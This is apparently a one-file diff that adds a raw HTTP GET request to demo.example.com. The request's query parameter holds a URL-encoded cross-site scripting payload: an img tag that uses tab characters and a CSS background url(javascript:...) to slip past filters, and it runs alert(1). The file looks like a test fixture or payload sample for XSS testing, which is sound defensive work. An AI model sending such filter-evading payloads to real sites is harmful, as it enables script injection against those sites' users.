@@ -1,0 +1,4 @@
+GET /a?s=<img%09src%3D1%09style%3D"background:url(javascript:alert(1))"> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
